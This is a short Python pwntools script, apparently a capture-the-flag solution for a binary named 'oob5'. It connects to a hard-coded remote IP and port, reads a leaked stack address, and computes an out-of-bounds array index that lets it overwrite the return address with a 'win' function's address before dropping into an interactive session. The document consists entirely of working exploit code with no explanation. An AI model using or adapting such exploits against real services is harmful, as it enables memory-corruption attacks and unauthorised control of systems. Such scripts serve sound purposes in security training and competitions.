from pwn import *

ip = "140.110.112.77"
port = 3115

context.arch = "amd64"

r = remote(ip, port)
# r = process("./oob5")

user = 0x601040
win = 0x4007B6

r.recvuntil("=")
stack = int(r.recvline()[:-1], 16)
log.info(hex(stack))

offset = (stack - 0x18 - user) // 8
r.sendlineafter(":", str(offset))

r.sendlineafter(":", p64(win))

r.interactive()
